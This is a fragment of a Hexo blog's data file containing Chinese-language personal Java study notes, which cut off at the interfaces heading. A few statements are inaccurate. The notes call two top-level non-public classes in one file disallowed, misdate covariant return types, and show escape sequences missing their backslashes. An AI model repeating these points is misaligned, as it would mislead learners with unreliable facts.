","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<p>[TOC]</p>\n<h1 id=\"java学习笔记知识点\"><a href=\"#java学习笔记知识点\" class=\"headerlink\" title=\"java学习笔记知识点\"></a>java学习笔记知识点</h1><ul>\n<li>一个源文件中只能有一个 public 类</li>\n<li>一个源文件可以有多个非 public 类</li>\n</ul>\n<pre><code class=\"java\">class a{ class b{ }}        这样是允许的\nclass a{}class b{}            这样是不允许的</code></pre>\n<h3 id=\"类型默认值\"><a href=\"#类型默认值\" class=\"headerlink\" title=\"类型默认值\"></a>类型默认值</h3><p> Java 各个类型的默认值：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"><strong>数据类型</strong></th>\n<th><strong>默认值</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">byte</td>\n<td>0</td>\n</tr>\n<tr>\n<td align=\"left\">short</td>\n<td>0</td>\n</tr>\n<tr>\n<td align=\"left\">int</td>\n<td>0</td>\n</tr>\n<tr>\n<td align=\"left\">long</td>\n<td>0L</td>\n</tr>\n<tr>\n<td align=\"left\">float</td>\n<td>0.0f</td>\n</tr>\n<tr>\n<td align=\"left\">double</td>\n<td>0.0d</td>\n</tr>\n<tr>\n<td align=\"left\">char</td>\n<td>‘u0000’</td>\n</tr>\n<tr>\n<td align=\"left\">String (or any object)</td>\n<td>null</td>\n</tr>\n<tr>\n<td align=\"left\">boolean</td>\n<td>false</td>\n</tr>\n</tbody></table>\n<p>Java支持的一些转义字符序列。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">符号</th>\n<th align=\"left\">字符含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">\\n</td>\n<td align=\"left\">换行 (0x0a)</td>\n</tr>\n<tr>\n<td align=\"left\">\\r</td>\n<td align=\"left\">回车 (0x0d)</td>\n</tr>\n<tr>\n<td align=\"left\">\\f</td>\n<td align=\"left\">换页符(0x0c)</td>\n</tr>\n<tr>\n<td align=\"left\">\\b</td>\n<td align=\"left\">退格 (0x08)</td>\n</tr>\n<tr>\n<td align=\"left\">\\0</td>\n<td align=\"left\">空字符 (0x0)</td>\n</tr>\n<tr>\n<td align=\"left\">\\s</td>\n<td align=\"left\">空格 (0x20)</td>\n</tr>\n<tr>\n<td align=\"left\">\\t</td>\n<td align=\"left\">制表符</td>\n</tr>\n<tr>\n<td align=\"left\">&quot;</td>\n<td align=\"left\">双引号</td>\n</tr>\n<tr>\n<td align=\"left\">&#39;</td>\n<td align=\"left\">单引号</td>\n</tr>\n<tr>\n<td align=\"left\">\\</td>\n<td align=\"left\">反斜杠</td>\n</tr>\n<tr>\n<td align=\"left\">\\ddd</td>\n<td align=\"left\">八进制字符 (ddd)</td>\n</tr>\n<tr>\n<td align=\"left\">\\uxxxx</td>\n<td align=\"left\">16进制Unicode字符 (xxxx)</td>\n</tr>\n</tbody></table>\n<p>Java语言支持的变量类型有：</p>\n<ul>\n<li>类变量：独立于方法之外的变量，用 static 修饰。</li>\n<li>实例变量：独立于方法之外的变量，不过没有 static 修饰。</li>\n<li>局部变量：类的方法中的变量。</li>\n</ul>\n<h3 id=\"final-修饰符\"><a href=\"#final-修饰符\" class=\"headerlink\" title=\"final 修饰符\"></a>final 修饰符</h3><p><strong>final 变量（常量）：</strong></p>\n<p>final 表示”最后的、最终的”含义，变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。</p>\n<p>final 修饰符通常和 static 修饰符一起使用来创建类常量。</p>\n<h3 id=\"abstract-修饰符\"><a href=\"#abstract-修饰符\" class=\"headerlink\" title=\"abstract 修饰符\"></a>abstract 修饰符</h3><p><strong>抽象类：</strong></p>\n<p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。</p>\n<p>一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。</p>\n<p>抽象类可以包含抽象方法和非抽象方法。</p>\n<h2 id=\"赋值运算符\"><a href=\"#赋值运算符\" class=\"headerlink\" title=\"赋值运算符\"></a>赋值运算符</h2><p>下面是Java语言支持的赋值运算符：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">操作符</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">例子</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">=</td>\n<td align=\"left\">简单的赋值运算符，将右操作数的值赋给左侧操作数</td>\n<td align=\"left\">C = A + B将把A + B得到的值赋给C</td>\n</tr>\n<tr>\n<td align=\"left\">+ =</td>\n<td align=\"left\">加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数</td>\n<td align=\"left\">C + = A等价于C = C + A</td>\n</tr>\n<tr>\n<td align=\"left\">- =</td>\n<td align=\"left\">减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数</td>\n<td align=\"left\">C - = A等价于C = C - A</td>\n</tr>\n<tr>\n<td align=\"left\">* =</td>\n<td align=\"left\">乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数</td>\n<td align=\"left\">C * = A等价于C = C * A</td>\n</tr>\n<tr>\n<td align=\"left\">/ =</td>\n<td align=\"left\">除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数</td>\n<td align=\"left\">C / = A，C 与 A 同类型时等价于 C = C / A</td>\n</tr>\n<tr>\n<td align=\"left\">（％）=</td>\n<td align=\"left\">取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数</td>\n<td align=\"left\">C％= A等价于C = C％A</td>\n</tr>\n<tr>\n<td align=\"left\">&lt;&lt; =</td>\n<td align=\"left\">左移位赋值运算符</td>\n<td align=\"left\">C &lt;&lt; = 2等价于C = C &lt;&lt; 2</td>\n</tr>\n<tr>\n<td align=\"left\">&gt;&gt; =</td>\n<td align=\"left\">右移位赋值运算符</td>\n<td align=\"left\">C &gt;&gt; = 2等价于C = C &gt;&gt; 2</td>\n</tr>\n<tr>\n<td align=\"left\">＆=</td>\n<td align=\"left\">按位与赋值运算符</td>\n<td align=\"left\">C＆= 2等价于C = C＆2</td>\n</tr>\n<tr>\n<td align=\"left\">^ =</td>\n<td align=\"left\">按位异或赋值操作符</td>\n<td align=\"left\">C ^ = 2等价于C = C ^ 2</td>\n</tr>\n<tr>\n<td align=\"left\">| =</td>\n<td align=\"left\">按位或赋值操作符</td>\n<td align=\"left\">C | = 2等价于C = C | 2</td>\n</tr>\n</tbody></table>\n<h2 id=\"instanceof-运算符\"><a href=\"#instanceof-运算符\" class=\"headerlink\" title=\"instanceof 运算符\"></a>instanceof 运算符</h2><p>该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。</p>\n<p>instanceof运算符使用格式如下：</p>\n<pre><code>( Object reference variable ) instanceof  (class/interface type)</code></pre><p>如果运算符左侧变量所指的对象，是操作符右侧类或接口(class/interface)的一个对象，那么结果为真。</p>\n<p>下面是一个例子：</p>\n<pre><code>String name = &quot;James&quot;;\nboolean result = name instanceof String; // 由于 name 是 String 类型，所以返回真</code></pre><p>如果被比较的对象兼容于右侧类型,该运算符仍然返回true。</p>\n<p>看下面的例子：</p>\n<pre><code class=\"java\">class Vehicle {}\n\npublic class Car extends Vehicle {\n   public static void main(String[] args){\n      Vehicle a = new Car();\n      boolean result =  a instanceof Car;\n      System.out.println( result);\n   }\n}</code></pre>\n<h2 id=\"Java-增强-for-循环\"><a href=\"#Java-增强-for-循环\" class=\"headerlink\" title=\"Java 增强 for 循环\"></a>Java 增强 for 循环</h2><p>Java5 引入了一种主要用于数组的增强型 for 循环。</p>\n<p>Java 增强 for 循环语法格式如下:</p>\n<p>for(声明语句 : 表达式) {   //代码句子 }</p>\n<p><strong>声明语句：</strong>声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p>\n<p><strong>表达式：</strong>表达式是要访问的数组名，或者是返回值为数组的方法。</p>\n<p><strong>实例：</strong></p>\n<pre><code class=\"java\">public class Test {\n   public static void main(String args[]){\n      int [] numbers = {10, 20, 30, 40, 50};\n\n      for(int x : numbers ){\n         System.out.print( x );\n         System.out.print(&quot;,&quot;);\n      }\n      System.out.print(&quot;\\n&quot;);\n      String [] names ={&quot;James&quot;, &quot;Larry&quot;, &quot;Tom&quot;, &quot;Lacy&quot;};\n      for( String name : names ) {\n         System.out.print( name );\n         System.out.print(&quot;,&quot;);\n      }\n   }\n}</code></pre>\n<h2 id=\"String类\"><a href=\"#String类\" class=\"headerlink\" title=\"String类\"></a>String类</h2><p>java的String类一般定义后不再改变（字符串），要频繁修改，使用StringBuffer 和 StringBuilder 类</p>\n<p>java的字符数组可以直接用new String()方式转换成字符串。</p>\n<h2 id=\"Java-StringBuffer-和-StringBuilder-类\"><a href=\"#Java-StringBuffer-和-StringBuilder-类\" class=\"headerlink\" title=\"Java StringBuffer 和 StringBuilder 类\"></a>Java StringBuffer 和 StringBuilder 类</h2><p>当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。</p>\n<p>和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。</p>\n<p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</p>\n<p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p>\n<h2 id=\"JAVA的Main函数\"><a href=\"#JAVA的Main函数\" class=\"headerlink\" title=\"JAVA的Main函数\"></a>JAVA的Main函数</h2><h3 id=\"public-static-void-main-String-args\"><a href=\"#public-static-void-main-String-args\" class=\"headerlink\" title=\"public static void main(String[] args)\"></a>public static void main(String[] args)</h3><p>如果要调用其他类的main函数，只要像调用它的公有方法一样就行，但要记得必须带上一个String字符串参数（new []String{}）。</p>\n<p>另，由于main函数是静态方法，所以调用时并不需要对象实例。</p>\n<p>例：</p>\n<p>Test.java</p>\n<pre><code class=\"java\">public class Test {\n    public static void main(String[] args) {\n//        int x=10;\n        int[] str={1,2,3,4,5};\n        for(int i:str)\n        {\n            System.out.println(&quot;这个数现在为：&quot;+i);\n        }\n    }\n}\n</code></pre>\n<p>TestTest.java</p>\n<pre><code class=\"java\">public class TestTest {\n    public static void main(String[] args) {\n//        Test test=new Test();\n        Test.main(new String[]{});\n    }\n}</code></pre>\n<p>运行结果：</p>\n<pre><code class=\"shell\">D:\\JDK\\8\\bin\\java.exe TestTest\n这个数现在为：1\n这个数现在为：2\n这个数现在为：3\n这个数现在为：4\n这个数现在为：5</code></pre>\n<ol>\n<li><h4 id=\"public\"><a href=\"#public\" class=\"headerlink\" title=\"public\"></a>public</h4><p>访问修饰符，public表示可访问权限最高。</p>\n</li>\n<li><h4 id=\"static\"><a href=\"#static\" class=\"headerlink\" title=\"static\"></a>static</h4><p>static关键字是重点。<br>static关键字用来修饰静态成员变量或者方法。</p>\n<p>通俗的说，static表示其修饰的成员变量或方法不需要实例化类就可以使用。也就是说，static变量不依赖于类的任何实例，只要类被加载(加载不等于实例化)，jvm（java虚拟机）就可以直接找到他们而不需要创建关于类的任何对象。<br>static关键字前可以有修饰符进行修饰，当使用public static时，其实相当于创建了一个<strong>全局变量(方法)</strong>。<br>再来看static修饰的代码块(即为static {…}形式的)，也叫做静态代码块。概念不必多讲，静态代码块有一个非常重要的特点：</p>\n<p><strong>随着类的加载而执行且只执行一次</strong>。<br>静态代码块可以有多个，位置可以随便放，它不在任何的方法体内，jvm加载类时会优先执行这些静态的代码块，如果static代码块有多个，jvm将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。</p>\n<p>那么main函数前加public static的意义是什么呢？意义就是这样的话，在当前类还未实例化的时候，可以运行main函数。</p>\n</li>\n<li><h4 id=\"void\"><a href=\"#void\" class=\"headerlink\" title=\"void\"></a>void</h4><p>与C系语言不同的是，java语言默认都是正常状态结束。也就是System.exit(0)，异常结束是1。所以，java的主方法没有必要存在返回值，即void。</p>\n</li>\n<li><h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h4><p>沿袭C系列main命名的主函数。</p>\n</li>\n<li><h4 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String[]\"></a>String[]</h4><p>使用命令行运行class文件的时候是可以附加参数的，懂得都懂，比如 Terminal&gt;java HelloWorld test  这种写法。test会作为参数传入mian方法。因为参数并不仅限一个，所以定义成数组格式。</p>\n<p>但在IDE中运行Java程序还是必须得在main函数中加上String[] args，否则main函数无法运行。</p>\n<p><strong>用String数组得原因：</strong><br>String作为java中最万能的包装类具有普遍性。天地万物都可以解释成String，String也可以解析成天地万物，所以用String来存放参数自然是最优选择。<br>ps.在java 1.5以后，String[]完全可以写成String…(不定项参数)，不妨试一下。</p>\n</li>\n<li><h4 id=\"args\"><a href=\"#args\" class=\"headerlink\" title=\"args\"></a>args</h4><p>计算机领域用来表示参数的变量名其实就那么几个，params，args算是约定俗成的了。其实完全可以叫abc，这个想怎么叫就怎么叫。</p>\n</li>\n</ol>\n<h2 id=\"Java-流-Stream-、文件-File-和IO\"><a href=\"#Java-流-Stream-、文件-File-和IO\" class=\"headerlink\" title=\"Java 流(Stream)、文件(File)和IO\"></a>Java 流(Stream)、文件(File)和IO</h2><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p>\n<p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p>\n<p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p>\n<h3 id=\"读取控制台输入\"><a href=\"#读取控制台输入\" class=\"headerlink\" title=\"读取控制台输入\"></a>读取控制台输入</h3><p>Java 的控制台输入由 System.in 完成。</p>\n<p>为了获得一个绑定到控制台的字符流，需要把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。</p>\n<pre><code class=\"java\">BufferedReader br = new BufferedReader(new \n                      InputStreamReader(System.in));</code></pre>\n<p><strong>BufferedReader</strong> 对象创建后，便可以使用 <strong>read()</strong> 方法从控制台读取一个字符，或者用 <strong>readLine()</strong> 方法读取一个字符串。</p>\n<h3 id=\"控制台输出\"><a href=\"#控制台输出\" class=\"headerlink\" title=\"控制台输出\"></a>控制台输出</h3><p>控制台的输出由 print( ) 和 println() 完成，这些方法都由类 PrintStream 定义，System.out 是该类对象的一个引用。</p>\n<p>PrintStream 继承了 OutputStream类，并且实现了方法 write()。这样，write() 也可以用来往控制台写操作。</p>\n<pre><code class=\"java\">//用 write() 把字符 &quot;A&quot; 和紧跟着的换行符输出到屏幕\nimport java.io.*;\n\n//演示 System.out.write().\npublic class WriteDemo {\n    public static void main(String args[]) {\n        int b;        //用char也行\n        b = &#39;A&#39;;\n        System.out.write(b);\n        System.out.write(&#39;\\n&#39;);\n    }\n}</code></pre>\n<p>write() 方法不经常使用，因为 print() 和 println() 方法用起来更为方便。</p>\n<h3 id=\"读写文件\"><a href=\"#读写文件\" class=\"headerlink\" title=\"读写文件\"></a>读写文件</h3><p>下图是一个描述输入流和输出流的类层次图。</p>\n<p><img src=\"/img/iostream2xx.png\" alt=\"img\"></p>\n<h2 id=\"Java-异常处理\"><a href=\"#Java-异常处理\" class=\"headerlink\" title=\"Java 异常处理\"></a>Java 异常处理</h2><p>异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。</p>\n<p>比如说，你的代码少了一个分号，那么运行出来结果是提示是错误 java.lang.Error；如果你用System.out.println(11/0)，那么你是因为你用0做了除数，会抛出 java.lang.ArithmeticException 的异常。</p>\n<p>异常发生的原因有很多，通常包含以下几大类：</p>\n<ul>\n<li>用户输入了非法数据。</li>\n<li>要打开的文件不存在。</li>\n<li>网络通信时连接中断，或者JVM内存溢出。</li>\n</ul>\n<p>这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。-</p>\n<p>要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常：</p>\n<ul>\n<li><strong>检查性异常：</strong>最具代表的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。</li>\n<li><strong>运行时异常：</strong> 运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。</li>\n<li><strong>错误：</strong> 错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。</li>\n</ul>\n<p>异常类有两个主要的子类：IOException 类和 RuntimeException 类。</p>\n<p><img src=\"/img/12-130Q1234I6223.jpg\" alt=\"img\"></p>\n<h3 id=\"捕获异常\"><a href=\"#捕获异常\" class=\"headerlink\" title=\"捕获异常\"></a>捕获异常</h3><p>使用 try 和 catch 关键字可以捕获异常。try/catch 代码块放在异常可能发生的地方。</p>\n<p>try/catch代码块中的代码称为保护代码，使用 try/catch 的语法如下：</p>\n<pre><code class=\"java\">try\n{\n   // 程序代码\n}catch(ExceptionName e1)\n{\n   //Catch 块\n}</code></pre>\n<p>Catch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。</p>\n<p>如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。</p>\n<h3 id=\"多重捕获块\"><a href=\"#多重捕获块\" class=\"headerlink\" title=\"多重捕获块\"></a>多重捕获块</h3><p>一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获。</p>\n<pre><code class=\"java\">try{\n   // 程序代码\n}catch(异常类型1 异常的变量名1){\n  // 程序代码\n}catch(异常类型2 异常的变量名2){\n  // 程序代码\n}catch(异常类型3 异常的变量名3){\n  // 程序代码\n}</code></pre>\n<p>上面的代码段包含了 3 个 catch块。</p>\n<p>可以在 try 语句后面添加任意数量的 catch 块。</p>\n<p>如果保护代码中发生异常，异常被抛给第一个 catch 块。</p>\n<p>如果抛出异常的数据类型与 ExceptionType1 匹配，它在这里就会被捕获。</p>\n<p>如果不匹配，它会被传递给第二个 catch 块。</p>\n<p>如此，直到异常被捕获或者通过所有的 catch 块。</p>\n<h3 id=\"throws-throw-关键字：\"><a href=\"#throws-throw-关键字：\" class=\"headerlink\" title=\"throws/throw 关键字：\"></a>throws/throw 关键字：</h3><p>如果一个方法没有捕获到一个检查性异常，那么该方法必须使用 throws 关键字来声明。throws 关键字放在方法签名的尾部。</p>\n<p>也可以使用 throw 关键字抛出一个异常，无论它是新实例化的还是刚捕获到的。</p>\n<p>下面方法的声明抛出一个 RemoteException 异常：</p>\n<pre><code class=\"java\">import java.io.*;\npublic class className\n{\n  public void deposit(double amount) throws RemoteException\n  {\n    // Method implementation\n    throw new RemoteException();\n  }\n  //Remainder of class definition\n}</code></pre>\n<p>一个方法可以声明抛出多个异常，多个异常之间用逗号隔开。</p>\n<pre><code class=\"java\">import java.io.*;\npublic class className\n{\n   public void withdraw(double amount) throws RemoteException,\n                              InsufficientFundsException\n   {\n       // Method implementation\n   }\n   //Remainder of class definition\n}</code></pre>\n<h3 id=\"finally关键字\"><a href=\"#finally关键字\" class=\"headerlink\" title=\"finally关键字\"></a>finally关键字</h3><p>finally 关键字用来创建在 try 代码块后面执行的代码块。</p>\n<p>无论是否发生异常，finally 代码块中的代码总会被执行。</p>\n<p>在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。</p>\n<p>finally 代码块出现在 catch 代码块最后，语法如下：</p>\n<pre><code class=\"java\">try{\n  // 程序代码\n}catch(异常类型1 异常的变量名1){\n  // 程序代码\n}catch(异常类型2 异常的变量名2){\n  // 程序代码\n}finally{\n  // 程序代码\n}</code></pre>\n<p><strong>注意事项：</strong></p>\n<ul>\n<li>catch 不能独立于 try 存在。</li>\n<li>在 try/catch 后面添加 finally 块并非强制性要求的。</li>\n<li>try 代码后不能既没 catch 块也没 finally 块。</li>\n<li>try, catch, finally 块之间不能添加任何代码。</li>\n</ul>\n<h2 id=\"JAVA继承\"><a href=\"#JAVA继承\" class=\"headerlink\" title=\"JAVA继承\"></a>JAVA继承</h2><p>java的继承和C语言差不多，除了java的类不能多继承，但类可以多继承接口。</p>\n<h2 id=\"继承关键字\"><a href=\"#继承关键字\" class=\"headerlink\" title=\"继承关键字\"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>\n<h3 id=\"extends关键字\"><a href=\"#extends关键字\" class=\"headerlink\" title=\"extends关键字\"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>\n<pre><code class=\"java\">public class Animal { \n    private String name;   \n    private int id; \n    public Animal(String myName, String myId) { \n        name= myName;\n        id= myId;\n        //初始化属性值的具体实现\n    } \n    public void eat() {  //吃东西方法的具体实现  } \n    public void sleep() { //睡觉方法的具体实现  } \n} \n\npublic class Penguin  extends  Animal{ \n    public Penguin(String myName,String myId){\n        super(myName, myId)        //直接调用父类构造方法\n    }\n}</code></pre>\n<h3 id=\"implements关键字\"><a href=\"#implements关键字\" class=\"headerlink\" title=\"implements关键字\"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>\n<pre><code class=\"java\">public interface A {\n    public void eat();\n    public void sleep();\n}\n\npublic interface B {\n    public void show();\n}\n\npublic class C implements A,B {\n}</code></pre>\n<h3 id=\"super-与-this-关键字\"><a href=\"#super-与-this-关键字\" class=\"headerlink\" title=\"super 与 this 关键字\"></a>super 与 this 关键字</h3><p><strong>super</strong>关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>\n<p><strong>super()</strong>函数：可以用于调用直接父类构造函数。</p>\n<p>如果父类构造函数没有参数，则在子类的构造器中不需要使用 <strong>super</strong> 关键字调用父类构造器，系统会自动调用父类的无参构造函数。</p>\n<p><strong>this</strong>关键字：指向本类的引用。</p>\n<p><strong>PS：</strong>使用super调用父类函数中有this关键字时，this指向的不是本类（子类）的引用，不会改变本类的成员变量，也就是不会改变本类的状态。</p>\n<p><strong>实例</strong></p>\n<pre><code class=\"java\">class Animal {\n  void eat() {\n    System.out.println(&quot;animal : eat&quot;);\n  }\n}\n\nclass Dog extends Animal {\n  void eat() {\n    System.out.println(&quot;dog : eat&quot;);\n  }\n  void eatTest() {\n    this.eat();   // this 调用自己的方法\n    super.eat();  // super 调用父类方法\n  }\n}\n\npublic class Test {\n  public static void main(String[] args) {\n    Animal a = new Animal();\n    a.eat();\n    Dog d = new Dog();\n    d.eatTest();\n  }\n}</code></pre>\n<p>输出结果为：</p>\n<pre><code>animal : eat\ndog : eat\nanimal : eat</code></pre><h3 id=\"final关键字\"><a href=\"#final关键字\" class=\"headerlink\" title=\"final关键字\"></a>final关键字</h3><p>final 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写：</p>\n<ul>\n<li><p>声明类：</p>\n<pre><code class=\"java\">final class 类名 {//类体}</code></pre>\n</li>\n<li><p>声明方法：</p>\n<pre><code class=\"java\">修饰符(public/private/default/protected) final 返回值类型 方法名(){//方法体}</code></pre>\n</li>\n</ul>\n<p><strong>注</strong>:实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final</p>\n<h3 id=\"继承的特性\"><a href=\"#继承的特性\" class=\"headerlink\" title=\"继承的特性\"></a>继承的特性</h3><ul>\n<li>子类拥有父类非 private 的属性、方法。</li>\n<li>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</li>\n<li>子类可以用自己的方式实现父类的方法。</li>\n<li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li>\n<li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li>\n</ul>\n<h2 id=\"Java-重写-Override-与重载-Overload\"><a href=\"#Java-重写-Override-与重载-Overload\" class=\"headerlink\" title=\"Java 重写(Override)与重载(Overload)\"></a>Java 重写(Override)与重载(Overload)</h2><h3 id=\"方法的重写规则\"><a href=\"#方法的重写规则\" class=\"headerlink\" title=\"方法的重写规则\"></a>方法的重写规则</h3><ul>\n<li>参数列表与被重写方法的参数列表必须完全相同。</li>\n<li>返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。</li>\n<li>访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。</li>\n<li>父类的成员方法只能被它的子类重写。</li>\n<li>声明为 final 的方法不能被重写。</li>\n<li>声明为 static 的方法不能被重写，但是能够被再次声明。</li>\n<li>子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。</li>\n<li>子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。</li>\n<li>重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。</li>\n<li>构造方法不能被重写。</li>\n<li>如果不能继承一个类，则不能重写该类的方法。</li>\n</ul>\n<h3 id=\"重载-Overload\"><a href=\"#重载-Overload\" class=\"headerlink\" title=\"重载(Overload)\"></a>重载(Overload)</h3><p>重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。</p>\n<p>每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。</p>\n<p>最常用的地方就是构造器（构造函数）的重载。</p>\n<p><strong>重载规则:</strong></p>\n<ul>\n<li>被重载的方法必须改变参数列表(参数个数或类型不一样)；</li>\n<li>被重载的方法可以改变返回类型；</li>\n<li>被重载的方法可以改变访问修饰符；</li>\n<li>被重载的方法可以声明新的或更广的检查异常；</li>\n<li>方法能够在同一个类中或者在一个子类中被重载。</li>\n<li><strong>无法以返回值类型作为重载函数的区分标准</strong>。（跟C语言类似）</li>\n</ul>\n<h2 id=\"Java-多态\"><a href=\"#Java-多态\" class=\"headerlink\" title=\"Java 多态\"></a>Java 多态</h2><h3 id=\"多态存在的三个必要条件\"><a href=\"#多态存在的三个必要条件\" class=\"headerlink\" title=\"多态存在的三个必要条件\"></a>多态存在的三个必要条件</h3><ul>\n<li>继承</li>\n<li>重写</li>\n<li><strong>父类引用指向子类对象</strong>：<strong>Parent p = new Child();</strong> （关键点！！！）</li>\n</ul>\n<h2 id=\"虚函数\"><a href=\"#虚函数\" class=\"headerlink\" title=\"虚函数\"></a>虚函数</h2><p>虚函数的存在是为了多态。</p>\n<p>Java 中其实没有虚函数的概念，它的普通函数就相当于 C++ 的虚函数，动态绑定是Java的默认行为。如果 Java 中不希望某个函数具有虚函数特性，可以加上 final 关键字变成非虚函数。</p>\n<h3 id=\"重写\"><a href=\"#重写\" class=\"headerlink\" title=\"重写\"></a>重写</h3><p>当子类对象调用重写的方法时，调用的是子类的方法，而不是父类中被重写的方法。</p>\n<p>要想调用父类中被重写的方法，则必须使用关键字 <strong>super</strong>。</p>\n<p>（这也是为什么super()函数调用父类构造方法中有this时，不会改变子类的状态，它调用的是父类的引用，改变的是父类的状态，即使这个父类根本用不到）</p>\n<h2 id=\"抽象方法\"><a href=\"#抽象方法\" class=\"headerlink\" title=\"抽象方法\"></a>抽象方法</h2><p>如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。</p>\n<p>Abstract 关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。</p>\n<p>抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。</p>\n<pre><code class=\"java\">public abstract class Employee\n{\n   private String name;\n   private String address;\n   private int number;\n\n   public abstract double computePay();\n\n   //其余代码\n}</code></pre>\n<p>声明抽象方法会造成以下两个结果：</p>\n<ul>\n<li>如果一个类包含抽象方法，那么该类必须是抽象类。</li>\n<li>任何子类必须重写父类的抽象方法，或者声明自身为抽象类。</li>\n</ul>\n<p>继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。</p>\n<p><strong>就跟C语言差不多</strong></p>\n<h2 id=\"Java-接口\"><a href=\"#Java-接口\" class=\"headerlink\" title=\"Java 接口\"></a>Java 